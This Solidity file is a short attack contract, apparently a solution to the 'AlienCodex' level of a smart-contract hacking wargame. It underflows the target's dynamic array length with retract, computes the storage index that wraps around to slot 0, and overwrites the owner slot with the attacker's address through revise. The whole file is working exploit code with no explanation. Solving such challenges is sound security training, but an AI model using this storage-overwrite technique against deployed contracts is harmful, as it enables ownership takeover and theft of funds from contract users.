// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {AlienCodex} from "../src/AlienCodex.sol";

contract AlienCodexAttack {
    AlienCodex public codex;

    constructor(address _codexAddress) {
        codex = AlienCodex(_codexAddress);
    }

    function attack() public {
        codex.makeContact();
        codex.retract();
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 attackerAddress = bytes32(uint256(uint160(tx.origin)));
        codex.revise(index, attackerAddress);
    }
}
